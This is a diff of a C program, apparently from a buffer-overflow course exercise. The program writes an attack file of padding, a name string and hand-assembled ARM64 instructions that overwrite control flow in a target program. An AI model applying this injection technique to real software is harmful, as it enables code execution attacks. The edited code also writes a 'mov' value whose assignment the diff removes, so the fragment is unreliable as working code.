@@ -12,13 +12,12 @@ int main(void) {
    fputs("Rolex",psFile);   
    putc('\0', psFile);
 
-   fputs("%c",psFile); 
+   fputs("A",psFile); 
 
-   for (i = 0; i < 13; i++)
+   for (i = 0; i < 14; i++)
       putc('\0', psFile);    
    
-   adr = MiniAssembler_adr(0, 0x42005e, 0x42006c);
-   mov = MiniAssembler_mov(1, 'A');
+   adr = MiniAssembler_adr(0, 0x42005e, 0x420070);
    bl = MiniAssembler_bl(0x400600, 0x420074);
       
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
@@ -30,7 +29,7 @@ int main(void) {
    adr = MiniAssembler_adr(1,0x420044,0x42007c) ;
    strb = MiniAssembler_strb(0, 1); 
    branch = MiniAssembler_b(0x400864,0x420084);
-   movLocation = 0x42006c;
+   movLocation = 0x420070;
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
